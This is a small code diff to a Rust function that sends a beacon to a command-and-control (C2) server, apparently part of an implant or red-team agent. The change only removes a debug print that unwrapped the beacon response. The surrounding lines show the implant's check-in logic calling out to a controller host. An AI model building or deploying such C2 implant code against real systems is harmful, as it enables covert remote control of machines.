@@ -47,7 +47,6 @@ pub async fn run(
         // Send the beacon to the C2 server
         println!("Sending beacon at {}", chrono::Utc::now());
         let res = send_authenticated_request("post", beacon_url, beacon_json).await;
-        println!("Attempted to send beacon, response: {}", res.as_ref().unwrap().status());
         // Handle the response from the server
         match res {
             Ok(response) => {
